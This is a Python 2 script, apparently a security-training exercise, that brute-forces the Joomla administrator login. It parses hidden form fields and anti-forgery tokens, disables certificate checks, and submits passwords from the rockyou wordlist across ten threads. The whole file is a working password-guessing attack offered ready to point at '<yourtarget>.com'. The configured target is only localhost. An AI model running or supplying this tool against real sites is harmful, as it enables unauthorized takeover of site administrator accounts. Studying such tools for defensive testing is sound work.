# JOOMLA Administratior login form 
# http://<yourtarget>.com/administrator/
# <form action="/administrator/index.php" method="post" id="form-login" class="form-inline">
#   <input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="User Name" size="15"/>
#   <input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/>
#   <select id="lang" name="lang" class="inputbox advancedSelect">
#       <option value="" selected="selected">Language - Default</option>
#       <option value="en-GB">English (United Kingdom)</option>
#   </select>
#   <input type="hidden" name="option" value="com_login"/>
#   <input type="hidden" name="task" value="login"/>
#   <input type="hidden" name="return" value="aW5kZXgucGhw"/>
#   <input type="hidden" name="1796bae450f8430ba0d2de1656f3e0ec" value="1" />
# </form>

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
import ssl

from HTMLParser import HTMLParser

# general settings
user_thread = 10
username = "admin"
wordlist_file = "/usr/share/wordlists/rockyou.txt"
resume = None

# target specific settings
target_url = "https://127.0.0.1:9392/administrator/index.php"
target_post = "https://127.0.0.1:9392/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Logged in as"

class Bruter(object):
    
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            # we create a cookie container that will store the cookies in the "cookies" file
            jar = cookielib.FileCookieJar("cookies")
            # and we tell urllib2 to pass off any cookies to this container
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            # HTTPS - cert issues
            if hasattr(ssl, '_create_unverified_context'):
                ssl._create_default_https_context = ssl._create_unverified_context
            response = opener.open(target_url)
            
            page = response.read()
            # debug:
            #print page
            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())
            
            # we need to parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)
            # the parser returns a dictionary of all of the retrieved form elements
            post_tags = parser.tag_results

            # debug:
            #for tag in post_tags:
            #    print tag, post_tags[tag]

            # we add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            # debug:
            #print username_field, " : ", post_tags[username_field]
            #print password_field, " : ", post_tags[password_field] 

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()
            
            #print login_result

            if success_check in login_result:
                self.found = True
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."


class BruteParser(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    # our handler_starttag function is called whenever a tag is encountered.
    def handle_starttag(self, tag, attrs):
        # in particular we are looking for HTML input tags
        if tag == "input":
            # debug:            
            #print "[!] Debug: Input tag found!"
            tag_name = None
            tag_value = None
            # iterate over the attributes of the tag
            for name, value in attrs:
                # if we find the name
                if name == "name":
                    tag_name = value
                # if we find the value
                if name == "value":
                    tag_value = value
        
            # we associate them in the tag_results dictionary
            if tag_name is not None:
                self.tag_results[tag_name] = value


def build_wordlist(wordlist_file):
    
    #read in the word list
    fd = open(wordlist_file, "rb")
    # we read all the lines on the wordlist and we put
    # it into a List
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    # we iterate over each line in the file 
    for word in raw_words:
        
        word = word.rstrip()
        
        # this allow us to resume the brute forcing session if our
        # network connectivity is interrupted or the site goes down
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
        else:
            words.put(word)

    return words
   

words = build_wordlist(wordlist_file)

# debug word list:
#words = Queue.Queue()
#words.put("test")
#words.put("test2")

bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()


    






